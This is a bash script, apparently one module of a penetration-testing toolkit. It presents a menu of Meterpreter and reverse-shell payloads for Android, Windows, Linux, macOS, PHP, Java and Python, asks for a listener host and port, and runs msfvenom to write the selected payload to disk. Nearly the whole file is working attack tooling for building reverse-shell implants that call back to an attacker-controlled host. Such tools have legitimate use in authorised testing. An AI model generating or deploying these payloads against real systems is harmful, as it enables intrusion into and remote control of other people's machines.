#!/bin/bash

echo -e "${BLUE}Malicious Payloads${NC}"
echo
echo "1.   android/meterpreter/reverse_tcp"
echo "2.   cmd/windows/reverse_powershell"
echo "3.   java/jsp_shell_reverse_tcp (Linux)"
echo "4.   java/jsp_shell_reverse_tcp (Windows)"
echo "5.   linux/x64/meterpreter_reverse_https"
echo "6.   linux/x64/meterpreter_reverse_tcp"
echo "7.   linux/x64/shell/reverse_tcp"
echo "8.   osx/x64/meterpreter_reverse_https"
echo "9.   osx/x64/meterpreter_reverse_tcp"
echo "10.  php/meterpreter/reverse_tcp"
echo "11.  python/meterpreter_reverse_https"
echo "12.  python/meterpreter_reverse_tcp"
echo "13.  windows/x64/meterpreter_reverse_https"
echo "14.  windows/x64/meterpreter_reverse_tcp"
echo "15.  Previous menu"
echo
echo -n "Choice: "
read choice

case $choice in
     1) payload="android/meterpreter/reverse_tcp"
          extention=".apk"
          format="raw"
          arch="dalvik"
          platform="android";;
     2) payload="cmd/windows/reverse_powershell"
          extention=".bat"
          format="raw"
          arch="cmd"
          platform="windows";;
     3) payload="java/jsp_shell_reverse_tcp"
          extention=".jsp"
          format="raw"
          arch="elf"
          platform="linux";;
     4) payload="java/jsp_shell_reverse_tcp"
          extention=".jsp"
          format="raw"
          arch="cmd"
          platform="windows";;
     5) payload="linux/x64/meterpreter_reverse_https"
          extention=".elf"
          format="elf"
          arch="x64"
          platform="linux";;
     6) payload="linux/x64/meterpreter_reverse_tcp"
          extention=".elf"
          format="elf"
          arch="x64"
          platform="linux";;
     7) payload="linux/x64/shell/reverse_tcp"
          extention=".elf"
          format="elf"
          arch="x64"
          platform="linux";;
     8) payload="osx/x64/meterpreter_reverse_https"
          extention=".macho"
          format="macho"
          arch="x64"
          platform="osx";;
     9) payload="osx/x64/meterpreter_reverse_tcp"
          extention=".macho"
          format="macho"
          arch="x64"
          platform="osx";;
     10) payload="php/meterpreter/reverse_tcp"
          extention=".php"
          format="raw"
          arch="php"
          platform="php"
          encoder="php/base64";;
     11) payload="python/meterpreter_reverse_https"
          extention=".py"
          format="raw"
          arch="python"
          platform="python";;
     12) payload="python/meterpreter_reverse_tcp"
          extention=".py"
          format="raw"
          arch="python"
          platform="python";;
     13) payload="windows/x64/meterpreter_reverse_https"
          extention=".exe"
          format="exe"
          arch="x64"
          platform="windows";;
     14) payload="windows/x64/meterpreter_reverse_tcp"
          extention=".exe"
          format="exe"
          arch="x64"
          platform="windows";;
     15) f_main;;
     *) f_error;;
esac

echo
echo -n "LHOST: "
read lhost

# Check for no answer
if [[ -z $lhost ]]; then
     lhost=$ip
     echo "[*] Using $ip"
     echo
fi

echo -n "LPORT: "
read lport

# Check for no answer
if [[ -z $lport ]]; then
     lport=443
     echo "[*] Using 443"
     echo
fi

# Check for valid port number.
if [[ $lport -lt 1 || $lport -gt 65535 ]]; then
     f_error
fi

x=$(echo $payload | sed 's/\//-/g')

msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/$x-$lport$extention

echo
echo
